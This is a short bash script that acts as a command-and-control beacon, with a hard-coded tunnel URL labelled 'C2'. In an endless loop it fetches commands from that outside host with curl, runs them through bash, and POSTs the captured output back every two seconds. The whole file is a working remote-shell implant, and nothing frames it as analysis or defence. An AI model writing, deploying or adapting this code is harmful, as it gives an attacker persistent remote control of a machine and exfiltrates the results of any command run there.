#!/bin/bash
# C2 URL: https://taxi-collaborative-profiles-planets.trycloudflare.com
C2="https://taxi-collaborative-profiles-planets.trycloudflare.com"

while true; do
  # 1. Ask your Mac "What should I run?"
  # --max-time ensures it doesn't hang if your Mac goes to sleep
  CMD=$(curl -s --max-time 10 "$C2")
  
  if [ -n "$CMD" ] && [ "$CMD" != "none" ]; then
    # 2. Execute and capture EVERYTHING
    RESULT=$(/bin/bash -c "$CMD" 2>&1)
    
    # 3. Send the answer back to your Mac
    curl -s -X POST --data-binary "$RESULT" "$C2"
  fi
  # 2-second pulse makes it feel snappy
  sleep 2
done

